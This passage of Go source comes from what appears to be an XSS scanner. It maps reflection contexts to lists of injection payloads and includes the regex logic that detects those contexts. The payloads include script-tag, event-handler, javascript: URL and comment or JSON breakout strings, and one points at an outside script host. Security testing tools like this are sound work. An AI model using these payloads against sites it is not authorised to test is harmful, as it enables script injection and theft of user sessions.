		analysis.BreakoutSequence = ">"
		analysis.RecommendedPayloads = []string{
			"><script>alert(1)</script>",
			"><img src=x onerror=alert(1)>",
		}
	case ContextJavaScript:
		analysis.IsInScript = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = false
		analysis.RecommendedPayloads = []string{
			"alert(1)",
			"';alert(1);//",
		}
	case ContextHTMLComment:
		analysis.IsInComment = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "-->"
		analysis.RecommendedPayloads = []string{
			"--><script>alert(1)</script>",
			"--><img src=x onerror=alert(1)>",
		}
	case ContextHTMLTitle:
		analysis.IsInTitle = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "</title>"
		analysis.RecommendedPayloads = []string{
			"</title><script>alert(1)</script>",
			"</title><img src=x onerror=alert(1)>",
		}
	case ContextTextarea:
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "</textarea>"
		analysis.RecommendedPayloads = []string{
			"</textarea><script>alert(1)</script>",
			"</textarea><img src=x onerror=alert(1)>",
		}
	case ContextTextareaAttribute:
		analysis.IsAttributeValue = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "'>"
		analysis.RecommendedPayloads = []string{
			"'></textarea><script>alert(1)</script>",
			"></textarea><script>alert(1)</script>",
		}
	case ContextNoscript:
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "</noscript>"
		analysis.RecommendedPayloads = []string{
			"</noscript><script>alert(1)</script>",
			"'</noscript><script>alert(1)</script>",
			"\"</noscript><script>alert(1)</script>",
		}
	case ContextStyleAttribute:
		analysis.IsAttributeValue = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "'>"
		analysis.RecommendedPayloads = []string{
			"'></style><script>alert(1)</script>",
			"'></style><img src=x onerror=alert(1)>",
			"'><script>alert(1)</script>",
			"' onerror=alert(1)",
		}
	case ContextCSSExpression:
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "</style>"
		analysis.RecommendedPayloads = []string{
			"</style><script>alert(1)</script>",
			"</style><img src=x onerror=alert(1)>",
			"</style><svg onload=alert(1)>",
		}
	case ContextJSRegex:
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "*/;"
		analysis.RecommendedPayloads = []string{
			".*/;alert(1);//",
			".*/;eval('alert(1)');//",
			".*/;Function('alert(1)')();//",
		}
		return analysis
	case ContextJSAssignment:
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = ";"
		analysis.RecommendedPayloads = []string{
			";alert(1)//",
			"-alert(1)//",
			"alert(1)//",
			"';alert(1)//",
			"\";alert(1)//",
		}
	case ContextJSComment:
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "*/"
		analysis.RecommendedPayloads = []string{
			"*/alert(1);/*",
			"*/alert(document.domain);/*",
			"*/alert(document.cookie);/*",
			"*/eval('alert(1)');/*",
		}
	case ContextHTMLAttribute:
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = ">"
		analysis.RecommendedPayloads = []string{
			"'><script>alert(1)</script>",
			"' onerror=alert(1)",
			"'><img src=x onerror=alert(1)>",
			"'><svg onload=alert(1)>",
			"\"><script>alert(1)</script>",
			"\" onerror=alert(1)",
			"\"><img src=x onerror=alert(1)>",
			"\"><svg onload=alert(1)>",
		}
	case "script_src_attribute":
		analysis.TagName = "script"
		analysis.AttributeName = "src"
		analysis.IsAttributeValue = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "\">"
		analysis.RecommendedPayloads = []string{
			"\"></script><script>alert(1)</script><script src=\"",
			"\"><script>alert(1)</script>",
			"https://14.rs",
			"\"><img src=x onerror=alert(1)>",
		}
		return analysis
	case "attribute":
		// URL context (href, src, etc.) - use javascript: payloads
		analysis.IsInURL = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = false
		analysis.ExecutableContext = "javascript:"
		analysis.RecommendedPayloads = []string{
			"javascript:alert(1)",
			"javascript:alert(1)//",
			"javascript:alert(1);",
			"javascript:alert(1)/*",
		}
		return analysis
	default:
		analysis.IsExecutable = true
		analysis.RequiresBreakout = false
		analysis.RecommendedPayloads = []string{
			"<script>alert(1)</script>",
			"<img src=x onerror=alert(1)>",
		}
	}
	
	return analysis
}

// generateContextSpecificPayloads generates payloads based on detailed context analysis
func (s *Scanner) generateContextSpecificPayloads(analysis *ContextAnalysis) []string {
	if len(analysis.RecommendedPayloads) > 0 {
		return analysis.RecommendedPayloads
	}
	
	// Fallback to basic payloads if no specific recommendations
	return s.generatePayloads(analysis.ContextType)
}

// generatePayloads generates XSS payloads based on context
func (s *Scanner) generatePayloads(context HTMLContext) []string {
	var payloads []string

	switch context {
	case ContextHTMLBody:
		payloads = []string{
			// Most effective payloads only - optimized for speed
			"<script>alert(1)</script>",
			"<img src=x onerror=alert(1)>",
			"<svg onload=alert(1)>",
			"><script>alert(1)</script>",
			"><img src=x onerror=alert(1)>",
		}
	case ContextHTMLAttribute:
		// Generic HTML attribute - optimized payloads
		payloads = []string{
			"\" onerror=alert(1)",
			"\" onload=alert(1)",
			"'><script>alert(1)</script>",
			"x><script>alert(1)</script>",
			// Script src specific payloads
			"\"></script><script>alert(1)</script><script src=\"",
			"https://14.rs",
		}
	case ContextHTMLAttributeDoubleQuoted:
		// Double-quoted attributes - optimized payloads
		payloads = []string{
			"\"><script>alert(1)</script>",
			"\"><img src=x onerror=alert(1)>",
			"\" onerror=alert(1)",
			"\" onload=alert(1)",
		}
	case ContextHTMLAttributeSingleQuoted:
		// Single-quoted attributes - optimized payloads
		payloads = []string{
			"'><script>alert(1)</script>",
			"'><img src=x onerror=alert(1)>",
			"'><svg onload=alert(1)>",
			"'><iframe src=javascript:alert(1)>",
			"'><object data=javascript:alert(1)>",
			"'><embed src=javascript:alert(1)>",
			"' onerror=alert(1)",
			"' onload=alert(1)",
			"'><body onload=alert(1)>",
			"'><div onmouseover=alert(1)>",
			"'><marquee onstart=alert(1)>",
			"'><details open ontoggle=alert(1)>",
			"'><video src=x onerror=alert(1)>",
			"'><audio src=x onerror=alert(1)>",
		}
	case ContextHTMLAttributeUnquoted:
		// Unquoted attributes - optimized payloads
		payloads = []string{
			"x><script>alert(1)</script>",
			"x><img src=x onerror=alert(1)>",
			"x onerror=alert(1)>",
			"x onload=alert(1)>",
		}
	case ContextIframeSrc:
		// Iframe src attribute - direct JavaScript execution
		payloads = []string{
			"javascript:alert(1)",
			"javascript:alert('XSS')",
			"data:text/html,<script>alert(1)</script>",
			"vbscript:alert(1)",
		}
	case ContextIframeAttribute:
		// Iframe attribute (non-src) - optimized payloads for iframe context
		payloads = []string{
			"'></iframe><script>alert(1)</script>",
			"'></iframe><img src=x onerror=alert(1)>",
			"'></iframe><svg onload=alert(1)>",
			"'><script>alert(1)</script>",
			"'><img src=x onerror=alert(1)>",
			"'><svg onload=alert(1)>",
			"'><iframe src=javascript:alert(1)>",
			"'><object data=javascript:alert(1)>",
			"' onerror=alert(1)",
			"' onload=alert(1)",
			"'><embed src=javascript:alert(1)>",
		}
	case ContextIframeSrcdoc:
		// Iframe srcdoc attribute - special payloads for srcdoc context
		payloads = []string{
			"\"><script>alert(1)</script>",
			"\"><img src=x onerror=alert(1)>",
			"\"><svg onload=alert(1)>",
			"\"><iframe src=javascript:alert(1)>",
			"\" onload=alert(1)",
			"\" onerror=alert(1)",
			"\"><body onload=alert(1)>",
			"\"><div onmouseover=alert(1)>",
		}
	case ContextJavaScript:
		payloads = []string{
			// String termination - optimized
			"';alert(1);//",
			"\";alert(1);//",
		}
	case ContextHTMLTitle:
		payloads = []string{
			// Title tag breakout - optimized
			"</title><script>alert(1)</script>",
			"</title><img src=x onerror=alert(1)>",
		}
	case ContextHTMLComment:
		payloads = []string{
			// HTML comment breakout - optimized
			"--><script>alert(1)</script>",
			"--><img src=x onerror=alert(1)>",
		}
	case ContextTextarea:
		payloads = []string{
			// Textarea breakout - optimized
			"</textarea><script>alert(1)</script>",
			"</textarea><img src=x onerror=alert(1)>",
		}
	case ContextTextareaAttribute:
		payloads = []string{
			// Textarea attribute breakout - optimized
			"'></textarea><script>alert(1)</script>",
			"></textarea><script>alert(1)</script>",
		}
	case ContextNoscript:
		payloads = []string{
			// Noscript breakout - optimized
			"</noscript><script>alert(1)</script>",
			"'</noscript><script>alert(1)</script>",
			"\"</noscript><script>alert(1)</script>",
		}
	case ContextStyleAttribute:
		payloads = []string{
			// Style attribute breakout - optimized
			"'></style><script>alert(1)</script>",
			"'></style><img src=x onerror=alert(1)>",
			"'><script>alert(1)</script>",
			"' onerror=alert(1)",
		}
	case ContextHTMLAttributeName:
		payloads = []string{
			// HTML attribute name breakout - optimized
			" onload=alert(1)",
			"><img src=x onerror=alert(1)>",
		}
	case ContextHTMLAttributeNameUnquoted:
		payloads = []string{
			// Unquoted HTML attribute name breakout - optimized
			" onload=alert(1)",
			"><img src=x onerror=alert(1)>",
		}
	case ContextHTMLEscaped:
		payloads = []string{
			// HTML escaped context - optimized
			"alert(1)",
			"eval('alert(1)')",
		}
	case ContextDOM, ContextDOMDocumentWriteln, ContextDOMBased:
		payloads = []string{
			// DOM-based XSS - optimized
			"alert(1)",
			"eval('alert(1)')",
			"document.write('<script>alert(1)</script>')",
		}
	case ContextCSS:
		payloads = []string{
			"</style><script>alert(1)</script>",
			"</style><img src=x onerror=alert(1)>",
			"</style><svg onload=alert(1)>",
			"expression(alert(1))",
			"javascript:alert(1)",
		}
	case ContextURL:
		payloads = []string{
			"javascript:alert(1)",
			"data:text/html,<script>alert(1)</script>",
		}
	case ContextJSAssignment:
		payloads = []string{
			"alert(1)",
			"eval('alert(1)')",
		}
	case ContextScriptTag:
		payloads = []string{
			"alert(1)",
			"eval('alert(1)')",
		}
	case ContextScriptSrcAttribute:
		// Script src attribute - need to break out and create new script
		payloads = []string{
			"\"></script><script>alert(1)</script><script src=\"",
			"'></script><script>alert(1)</script><script src='",
			"https://14.rs",
			"javascript:alert(1)",
			"data:text/html,<script>alert(1)</script>",
		}
	case ContextJSRegex:
		payloads = []string{
			// Regex breakout payloads
			".*/;alert(1);//",
			".*/;eval('alert(1)');//",
			".*/;Function('alert(1)')();//",
			".*/;setTimeout('alert(1)',1);//",
		}
	case ContextJSComment:
		payloads = []string{
			// JavaScript comment breakout payloads
			"*/alert(1);/*",
			"*/alert(document.domain);/*",
			"*/alert(document.cookie);/*",
			"*/eval('alert(1)');/*",
			"*/Function('alert(1)')();/*",
			"*/setTimeout('alert(1)',1);/*",
		}
	case ContextCSSExpression:
		payloads = []string{
			"</style><script>alert(1)</script>",
			"</style><img src=x onerror=alert(1)>",
			"</style><svg onload=alert(1)>",
			"expression(alert(1))",
			"javascript:alert(1)",
		}
	case ContextAttribute:
		payloads = []string{
			"javascript:alert(1)",
			"data:text/html,<script>alert(1)</script>",
		}
	case ContextJSON:
		// JSON context - break out of JSON string literal and inject executable JavaScript
		payloads = []string{
			"\"}</script><script>alert(1)</script>",
			"\"}alert(1);/*",
			"\"}/*</script><script>alert(1)</script>",
			"\"}alert(1);",
			"\"}alert(document.domain);",
			"\"}eval('alert(1)');",
			"\"}Function('alert(1)')();",
			"\"}setTimeout('alert(1)',1);",
		}
	case ContextUnknown:
		// For unknown context, try essential payloads only
		payloads = []string{
			"<script>alert(1)</script>",
			"javascript:alert(1)",
			"<img src=x onerror=alert(1)>",
		}
	default:
		payloads = []string{
			// Universal payloads - optimized
			"<script>alert(1)</script>",
			"<img src=x onerror=alert(1)>",
			"javascript:alert(1)",
		}
	}

	return payloads
}

// detectReflectionContext determines where and how a parameter reflects
func (s *Scanner) detectReflectionContext(body string, testValue string) string {
	// Normalize for case-insensitive search
	bodyLower := strings.ToLower(body)
	testValueLower := strings.ToLower(testValue)
	
	// Check for DOM-based XSS patterns (from original Python tool)
	if strings.Contains(bodyLower, "window.location.hash") || strings.Contains(bodyLower, "location.hash") {
		if strings.Contains(bodyLower, "document.writeln") {
			return string(ContextDOMDocumentWriteln)
		} else {
			return string(ContextDOMBased)
		}
	}

	// Check for HTML escaping patterns
	if strings.Contains(bodyLower, "&amp;lt;") || strings.Contains(bodyLower, "&amp;gt;") {
		return string(ContextHTMLEscaped)
	}

	// Find the reflection point
	payloadIndex := strings.Index(bodyLower, testValueLower)
	if payloadIndex == -1 {
		return string(ContextUnknown)
	}



	// Get context area around the payload (larger context for better detection)
	start := max(0, payloadIndex-100)
	end := min(len(body), payloadIndex+len(testValue)+100)
	contextArea := body[start:end]
	contextAreaLower := strings.ToLower(contextArea)
	
	// Debug: log the context area for iframe detection
	if !s.config.Quiet {
	}

	// ISOLATED CONTEXT DETECTION - Each context is completely independent
	// Order from most specific to least specific to prevent conflicts
	
	// 1. TEXTAREA ATTRIBUTE - Most specific, completely isolated
	if regexp.MustCompile(`<textarea[^>]*\w+\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*>`).MatchString(contextAreaLower) {
		return string(ContextTextareaAttribute)
	}
	
	// 2. SCRIPT SRC ATTRIBUTE - Isolated script src detection
	if regexp.MustCompile(`<script[^>]*src\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*/?>`).MatchString(contextAreaLower) {
		return string(ContextScriptSrcAttribute)
	}
	
	// 3. IFRAME SRC ATTRIBUTE - Isolated iframe src detection  
	if regexp.MustCompile(`<iframe[^>]*src\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*>`).MatchString(contextAreaLower) {
		return string(ContextHTMLAttribute)
	}
	
	// 4. IFRAME ATTRIBUTE - Isolated iframe attribute detection
	if regexp.MustCompile(`<iframe[^>]*\w+\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*>`).MatchString(contextAreaLower) {
		return string(ContextHTMLAttribute)
	}
	
	// 5. STYLE ATTRIBUTE - Isolated style attribute detection
	if regexp.MustCompile(`<[^>]*style\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*>`).MatchString(contextAreaLower) {
		return string(ContextStyleAttribute)
	}
	
	// 6. LINK HREF ATTRIBUTE - Isolated link href detection (for CSS imports)
	if regexp.MustCompile(`<link[^>]*href\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*/?>`).MatchString(contextAreaLower) {
		return string(ContextHTMLAttribute)
	}
	
	// 7. A HREF ATTRIBUTE - Isolated anchor href detection (URL context for javascript: payloads)
	if regexp.MustCompile(`<a[^>]*href\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*>`).MatchString(contextAreaLower) {
		return string(ContextAttribute)
	}

	// 8. JAVASCRIPT CONTEXTS - Isolated JS detection within script tags
	if strings.Contains(contextAreaLower, "<script") && strings.Contains(contextAreaLower, "</script>") {
		// 8a. JS COMMENT - Most specific JS context
		if regexp.MustCompile(`/\*[^*]*` + regexp.QuoteMeta(testValueLower) + `[^*]*\*/`).MatchString(contextAreaLower) {
			return string(ContextJSComment)
		}
		// 8b. JS REGEX - Isolated regex detection
		if regexp.MustCompile(`(?:var|let|const)\s+\w+\s*=\s*/[^/]*` + regexp.QuoteMeta(testValueLower) + `[^/]*/`).MatchString(contextAreaLower) {
			return string(ContextJSRegex)
		}
		// 8c. JS DOUBLE QUOTED STRING - Isolated double quote detection
		if regexp.MustCompile(`(?:var|let|const)\s+\w+\s*=\s*"[^"]*` + regexp.QuoteMeta(testValueLower) + `[^"]*"`).MatchString(contextAreaLower) {
			return string(ContextJSAssignment)
		}
		// 8d. JS SINGLE QUOTED STRING - Isolated single quote detection
		if regexp.MustCompile(`(?:var|let|const)\s+\w+\s*=\s*'[^']*` + regexp.QuoteMeta(testValueLower) + `[^']*'`).MatchString(contextAreaLower) {
			return string(ContextJSAssignment)
		}
		// 8e. JS EVAL - Isolated eval detection
		if regexp.MustCompile(`eval\s*\(\s*` + regexp.QuoteMeta(testValueLower) + `\s*\)`).MatchString(contextAreaLower) {
			return string(ContextJSAssignment)
		}
		// 8f. JS VARIABLE ASSIGNMENT - Isolated variable assignment
		if regexp.MustCompile(`(?:var|let|const)\s+\w+\s*=\s*.*` + regexp.QuoteMeta(testValueLower) + `.*`).MatchString(contextAreaLower) {
			return string(ContextJSAssignment)
		}
		// 8g. JS FUNCTION PARAMETER - Isolated function parameter
		if regexp.MustCompile(`function\s*\w*\s*\([^)]*` + regexp.QuoteMeta(testValueLower) + `[^)]*\)`).MatchString(contextAreaLower) {
			return string(ContextJSAssignment)
		}
		// 8h. JS FUNCTION CALL - Isolated function call
		if regexp.MustCompile(`\w+\s*\([^)]*` + regexp.QuoteMeta(testValueLower) + `[^)]*\)`).MatchString(contextAreaLower) {
			return string(ContextJSAssignment)
		}
		// 8i. DEFAULT SCRIPT TAG - Fallback for script tags
		return string(ContextScriptTag)
	}

	// 9. HTML COMMENT - Isolated HTML comment detection
	if regexp.MustCompile(`<!--.*` + regexp.QuoteMeta(testValueLower) + `.*-->`).MatchString(contextAreaLower) {
		return string(ContextHTMLComment)
	}

	// 10. CSS CONTEXTS - Isolated CSS detection
	// 10a. CSS STYLE ATTRIBUTE VALUES - Isolated style attribute detection
	if regexp.MustCompile(`<style[^>]*\s+\w+\s*=\s*['"]` + regexp.QuoteMeta(testValueLower) + `['"][^>]*>`).MatchString(contextAreaLower) {
		return string(ContextStyleAttribute)
	}
	
	// 10b. CSS UNQUOTED STYLE ATTRIBUTES - Isolated unquoted style detection
	if regexp.MustCompile(`<style[^>]*\s+\w+\s*=\s*` + regexp.QuoteMeta(testValueLower) + `[^>]*>`).MatchString(contextAreaLower) {
		return string(ContextStyleAttribute)
	}

	// 10c. CSS STYLE ATTRIBUTE CONTENT - Isolated style attribute content
	if strings.Contains(contextAreaLower, "style=") {
		styleRegex := regexp.MustCompile(`style\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["']`)
		if styleRegex.MatchString(contextAreaLower) {
			return string(ContextCSSExpression)
		}
	}
	
	// 10d. CSS STYLE BLOCKS - Isolated CSS block detection
	if strings.Contains(contextAreaLower, "<style") && strings.Contains(contextAreaLower, "</style>") {
		styleStart := strings.Index(contextAreaLower, "<style")
		styleEnd := strings.Index(contextAreaLower[styleStart:], "</style>")
		if styleEnd != -1 {
			styleContentStart := styleStart + strings.Index(contextAreaLower[styleStart:], ">") + 1
			styleContent := contextAreaLower[styleContentStart:styleStart+styleEnd]
			if strings.Contains(styleContent, testValueLower) {
				return string(ContextCSSExpression)
			}
		}
	}
	
	// 10e. CSS PROPERTY VALUES - Isolated CSS property detection
	cssPropertyRegex := regexp.MustCompile(`(background|color|font|margin|padding|border|width|height|display|position|top|left|right|bottom|z-index|opacity|visibility|overflow|text|line|letter|word|white-space|vertical-align|text-align|text-decoration|text-transform|text-shadow|box-shadow|border-radius|transform|transition|animation|flex|grid|justify|align|gap|row|column)\s*:\s*` + regexp.QuoteMeta(testValueLower) + `\s*;?`)
	if cssPropertyRegex.MatchString(contextAreaLower) {
		return string(ContextCSSExpression)
	}
	
	// 10f. CSS EXPRESSION - Isolated CSS expression detection
	if regexp.MustCompile(`expression\s*\(\s*` + regexp.QuoteMeta(testValueLower) + `\s*\)`).MatchString(contextAreaLower) {
		return string(ContextCSSExpression)
	}

	// Check for iframe contexts FIRST (before general attribute detection)
	// Check for iframe srcdoc attribute context specifically (most critical for XSS)
	if regexp.MustCompile(`<iframe[^>]*srcdoc\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*>`).MatchString(contextAreaLower) {
		if !s.config.Quiet {
		}
		return string(ContextIframeSrcdoc) // Special context for iframe srcdoc
	}
	
	// Check for iframe src attribute context specifically
	if regexp.MustCompile(`<iframe[^>]*src\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*>`).MatchString(contextAreaLower) {
		return string(ContextIframeSrc) // Iframe src attribute - direct JavaScript execution
	}
	
	// Check for iframe attribute context specifically (non-src attributes) - handle multiline
	normalizedContext := strings.ReplaceAll(contextAreaLower, "\n", " ")
	if !s.config.Quiet {
	}
	if regexp.MustCompile(`<iframe[^>]*\w+\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*>`).MatchString(normalizedContext) {
		// Debug: log the context area and test value
		if !s.config.Quiet {
		}
		// Check if it's a single-quoted iframe attribute
		if regexp.MustCompile(`<iframe[^>]*\w+\s*=\s*'[^']*` + regexp.QuoteMeta(testValueLower) + `[^']*'[^>]*>`).MatchString(strings.ReplaceAll(contextAreaLower, "\n", " ")) {
			return string(ContextIframeAttribute) // Use iframe-specific context for iframe attributes
		}
		// Check if it's a double-quoted iframe attribute
		if regexp.MustCompile(`<iframe[^>]*\w+\s*=\s*"[^"]*` + regexp.QuoteMeta(testValueLower) + `[^"]*"[^>]*>`).MatchString(strings.ReplaceAll(contextAreaLower, "\n", " ")) {
			return string(ContextIframeAttribute) // Use iframe-specific context for iframe attributes
		}
		// Check if it's an unquoted iframe attribute
		if regexp.MustCompile(`<iframe[^>]*\w+\s*=\s*` + regexp.QuoteMeta(testValueLower) + `(?:[^>]*>|[\s/>])`).MatchString(strings.ReplaceAll(contextAreaLower, "\n", " ")) {
			return string(ContextIframeAttribute) // Use iframe-specific context for iframe attributes
		}
		return string(ContextIframeAttribute) // Default to iframe-specific context for iframe attributes
	}

	// Check for CSS import context (link rel="stylesheet") - these need CSS-specific payloads
	if regexp.MustCompile(`<link[^>]*rel\s*=\s*["']stylesheet["'][^>]*href\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*/?>`).MatchString(contextAreaLower) {
		return string(ContextCSS)
	}

	// Check for style src context (<style src="...">) - these need CSS-specific payloads
	if regexp.MustCompile(`<style[^>]*src\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*>`).MatchString(contextAreaLower) {
		return string(ContextCSS)
	}

	// Check for URL context (href, src, etc.) - these can execute javascript: URLs
	// Exclude script src as it's handled specifically above
	if regexp.MustCompile(`(?:href|data-href|src)\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["']`).MatchString(contextAreaLower) {
		// Make sure it's not a script src attribute
		if !regexp.MustCompile(`<script[^>]*src\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*>`).MatchString(contextAreaLower) {
			return string(ContextAttribute)
		}
	}
	
	// Check for action context (form action) - these need HTML attribute breakout payloads
	if regexp.MustCompile(`action\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["']`).MatchString(contextAreaLower) {
		return string(ContextHTMLAttribute)
	}
	
	// Check for src context (img, iframe, etc.) - these cannot execute javascript: URLs
	if regexp.MustCompile(`(?:src|data-src)\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["']`).MatchString(contextAreaLower) {
		return string(ContextHTMLAttribute)
	}

	// Check if it's in a title tag (non-executable context)
	if regexp.MustCompile(`<title[^>]*>.*` + regexp.QuoteMeta(testValueLower) + `.*</title>`).MatchString(contextAreaLower) {
		return string(ContextHTMLTitle)
	}

	// Check for textarea content (handle multiline with whitespace)
	if regexp.MustCompile(`<textarea[^>]*>[\s\S]*?` + regexp.QuoteMeta(testValueLower) + `[\s\S]*?</textarea>`).MatchString(contextAreaLower) {
		return string(ContextTextarea)
	}

	// Check for textarea attribute values (e.g., <textarea attribute=value>)
	if regexp.MustCompile(`<textarea[^>]*\s+\w+\s*=\s*["']?[^"'>]*` + regexp.QuoteMeta(testValueLower) + `[^"'>]*["']?[^>]*>`).MatchString(contextAreaLower) {
		return string(ContextTextareaAttribute)
	}


	// Check for noscript content (handle multiline with whitespace)
	if regexp.MustCompile(`<noscript[^>]*>[\s\S]*?` + regexp.QuoteMeta(testValueLower) + `[\s\S]*?</noscript>`).MatchString(contextAreaLower) {
		return string(ContextNoscript)
	}

	// Check for meta tag context
	if regexp.MustCompile(`<meta[^>]*content\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*>`).MatchString(contextAreaLower) {
		return string(ContextHTMLAttribute)
	}

	// Check for input value context
	if regexp.MustCompile(`<input[^>]*value\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*>`).MatchString(contextAreaLower) {
		return string(ContextHTMLAttribute)
	}

	// Check for JavaScript context outside script tags (event handlers, etc.)
	// Check for quoted event handlers
	if regexp.MustCompile(`(?:onload|onclick|onmouseover|onerror|onfocus|onblur)\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["']`).MatchString(contextAreaLower) {
		return string(ContextJavaScript)
	}
	
	// Check for unquoted event handlers (e.g., onclick=alert(1))
	if regexp.MustCompile(`(?:onload|onclick|onmouseover|onerror|onfocus|onblur)\s*=\s*` + regexp.QuoteMeta(testValueLower) + `(?:[^>]*>|[\s/>])`).MatchString(contextAreaLower) {
		return string(ContextJavaScript)
	}

	// Check for JavaScript context in data attributes
	if regexp.MustCompile(`data-\w+\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["']`).MatchString(contextAreaLower) {
		return string(ContextHTMLAttribute)
	}

	// Check for unquoted HTML attribute context (e.g., <tag attribute=PAYLOAD>)
	if regexp.MustCompile(`\w+\s*=\s*` + regexp.QuoteMeta(testValueLower) + `(?:[^>]*>|[\s/>])`).MatchString(contextAreaLower) {
		// Check if it's specifically an unquoted attribute (no quotes around the value)
		if !regexp.MustCompile(`\w+\s*=\s*["']` + regexp.QuoteMeta(testValueLower) + `["']`).MatchString(contextAreaLower) {
			return string(ContextHTMLAttributeUnquoted) // Unquoted attribute
		}
		return string(ContextHTMLAttribute) // Generic quoted attribute
	}

	// Check for attribute name context (e.g., <tag PAYLOAD="">)
	// More flexible pattern that handles empty values
	if regexp.MustCompile(`<[^>]*\s+` + regexp.QuoteMeta(testValueLower) + `\s*=\s*["'][^"']*["'][^>]*>`).MatchString(contextAreaLower) {
		return string(ContextHTMLAttributeName) // Attribute name context
	}

	// Check for attribute name context with empty value (e.g., <tag PAYLOAD="">)
	if regexp.MustCompile(`<[^>]*\s+` + regexp.QuoteMeta(testValueLower) + `\s*=\s*["']\s*["'][^>]*>`).MatchString(contextAreaLower) {
		return string(ContextHTMLAttributeName) // Attribute name context
	}

	// Check for unquoted attribute name context (e.g., <tag PAYLOAD=value>)
	if regexp.MustCompile(`<[^>]*\s+` + regexp.QuoteMeta(testValueLower) + `\s*=\s*[^"'\s>]+[^>]*>`).MatchString(contextAreaLower) {
		return string(ContextHTMLAttributeNameUnquoted) // Unquoted attribute name context
	}

	// Enhanced attribute name detection - check if the test value appears as an attribute name
	// This pattern should catch cases like <tag XSS_TEST_q_1234567890="">
	attributeNamePattern := regexp.MustCompile(`<[^>]*\s+` + regexp.QuoteMeta(testValueLower) + `\s*[^>]*>`)
	if attributeNamePattern.MatchString(contextAreaLower) {
		// Additional check: make sure it's followed by = (attribute assignment)
		if regexp.MustCompile(`<[^>]*\s+` + regexp.QuoteMeta(testValueLower) + `\s*=\s*[^>]*>`).MatchString(contextAreaLower) {
			return string(ContextHTMLAttributeName) // Attribute name context
		}
	}

	// Specific pattern for the attribute_name test case
	// This should catch <tag XSS_TEST_q_1234567890="">
	if regexp.MustCompile(`<[^>]*\s+` + regexp.QuoteMeta(testValueLower) + `\s*=\s*["'][^"']*["'][^>]*>`).MatchString(contextAreaLower) {
		return string(ContextHTMLAttributeName) // Attribute name context
	}

	// Even more specific pattern for empty attribute values
	if regexp.MustCompile(`<[^>]*\s+` + regexp.QuoteMeta(testValueLower) + `\s*=\s*["']\s*["'][^>]*>`).MatchString(contextAreaLower) {
		return string(ContextHTMLAttributeName) // Attribute name context
	}

	// Simple check: if the test value appears as an attribute name in any HTML tag
	// This is a fallback pattern that should catch most cases
	if regexp.MustCompile(`<[^>]*\s+` + regexp.QuoteMeta(testValueLower) + `[^>]*>`).MatchString(contextAreaLower) {
		// Additional check: make sure it's not just part of a larger word
		if !regexp.MustCompile(`\w+` + regexp.QuoteMeta(testValueLower) + `\w+`).MatchString(contextAreaLower) {
			return string(ContextHTMLAttributeName) // Attribute name context
		}
	}

	// Check for single-quoted HTML attribute context (e.g., <tag attribute='PAYLOAD'>)
	if regexp.MustCompile(`\w+\s*=\s*'` + regexp.QuoteMeta(testValueLower) + `'`).MatchString(contextAreaLower) {
		// Check if it's an iframe attribute specifically - simple check for iframe tag
		if strings.Contains(contextAreaLower, "<iframe") && strings.Contains(contextAreaLower, "attribute='") {
			return string(ContextIframeAttribute) // Iframe attribute with iframe-specific payloads
		}
		return string(ContextHTMLAttributeSingleQuoted) // Single-quoted attribute
	}

	// Check for double-quoted HTML attribute context (e.g., <tag attribute="PAYLOAD">)
	if regexp.MustCompile(`\w+\s*=\s*"` + regexp.QuoteMeta(testValueLower) + `"`).MatchString(contextAreaLower) {
		return string(ContextHTMLAttributeDoubleQuoted) // Double-quoted attribute
	}

	// Check for URL context in various attributes
	if regexp.MustCompile(`(?:url|src|href)\s*\([^)]*` + regexp.QuoteMeta(testValueLower) + `[^)]*\)`).MatchString(contextAreaLower) {
		return string(ContextURL)
	}

	// Check for JavaScript context in inline scripts
